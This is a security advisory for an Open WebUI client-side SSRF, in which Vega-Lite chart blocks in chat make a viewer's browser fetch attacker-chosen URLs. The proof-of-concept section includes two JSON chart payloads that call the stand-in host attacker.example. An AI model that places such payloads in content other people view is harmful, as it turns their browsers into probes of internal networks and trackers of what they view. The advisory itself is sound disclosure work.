# [M] Open WebUI: Client-side SSRF via unrestricted external resource loading in Vega/Vega-Lite chart rendering

## Summary
Severity: Medium
Advisory: GHSA-rffm-9q57-q649
CVE: CVE-2026-70480
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-rffm-9q57-q649
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0.6.34 <0.11.0

## Details
## Summary
Open WebUI renders `vega` and `vega-lite` fenced code blocks in chat content by building a Vega view in the viewer's browser without a restricted resource loader. Any user who can place such a block where another user will see it can make that user's browser issue attacker-chosen outbound GET requests, and read back responses from same-origin or CORS-permissive targets into the rendered page. Because the request comes from the browser, server-side SSRF protections never see it.

## Preconditions
Default configuration, no flags or environment variables involved: Vega blocks render unconditionally wherever chat content is displayed. The attacker needs an account that can put content in front of the victim, which covers a shared chat, a channel message, and model, RAG or tool output the attacker can influence. The victim must open the message, so this is not zero-click. Deployments where the victim's browser has no network position of interest lose little.

## Impact
The victim's browser becomes a request proxy into whatever it can reach: internal hosts and ports behind the perimeter, same-site endpoints, and out-of-band beacons that confirm a chart was viewed and by whom. Where the target is same-origin or returns permissive CORS headers, the response body is pulled back into the chart in the victim's page, which turns the request into a read. Requests are GET only, and no server-side data is exposed to the attacker directly.

## Fix
Fixed in 5278eb906 (#26806), released in 0.11.0. The view is now constructed with a loader whose `load` always throws and whose `sanitize` resolves the URI with the browser's own URL parser and permits only `data:` and same-origin results, so charts can only use inline `data.values`. Upgrading is sufficient; no configuration change is needed.

## Root cause
- `src/lib/utils/index.ts` — `renderVegaVisualization`
- `src/lib/components/chat/Messages/CodeBlock.svelte` — renders `vega`/`vega-lite` blocks

The renderer treated a chart spec as trusted authored content rather than as untrusted chat text, so it accepted Vega's default loader. That loader has two separate ways out of the page: `data.url` and topojson/geo sources are fetched at view construction, and image marks pass their `url` through `sanitize` and are written into the output SVG as `<image href>`, which the browser fetches when the chart is displayed. The second path survives downstream SVG sanitization because the URL is a legitimate attribute value, not markup.

## Proof of concept
Post either block into a chat, channel message, or shared chat that the victim will open. Neither requires the victim to interact beyond viewing.

```vega-lite
{"$schema":"https://vega.github.io/schema/vega-lite/v5.json","data":{"url":"http://attacker.example/probe?a=1"},"mark":"point"}
```

```vega-lite
{"$schema":"https://vega.github.io/schema/vega-lite/v5.json","data":{"values":[{"x":1}]},"mark":{"type":"image","url":"http://attacker.example/beacon.png"},"encoding":{"x":{"field":"x"}}}
```

The first fires at view construction; the second fires when the rendered SVG is displayed. Both are visible as outbound requests in the victim's network log and in the attacker's listener. After the fix neither request is made and inline `data.values` charts still render.

## Credits
- @Zureno — reported the issue and the `data.url` path.
- @Classic298 — identified the image-mark sink and authored the fix.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-rffm-9q57-q649
- https://github.com/open-webui/open-webui/pull/26806
- https://github.com/open-webui/open-webui/commit/5278eb906ebecefc6538a19bc86df09d997e43e6
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.11.0
